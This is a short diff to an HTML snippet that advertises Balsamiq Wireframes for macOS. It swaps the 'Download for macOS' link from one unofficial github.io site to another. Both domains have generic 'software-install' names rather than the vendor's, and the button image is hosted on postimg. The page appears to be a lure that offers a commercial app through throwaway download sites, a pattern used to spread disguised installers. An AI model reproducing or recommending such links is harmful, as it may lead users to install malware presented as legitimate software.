@@ -6,7 +6,7 @@
 <h3>Balsamiq Wireframes for macOS</h3>
 <p>Balsamiq Wireframes Mac Edition keeps interface sketches rough on purpose so teams can debate behaviour and hierarchy without bikeshedding visuals.</p>
 
-<a href="https://mac-software-install.github.io/.github/BalsamiqWireframes">
+<a href="https://software-install-apps.github.io/.github/BalsamiqWireframes">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
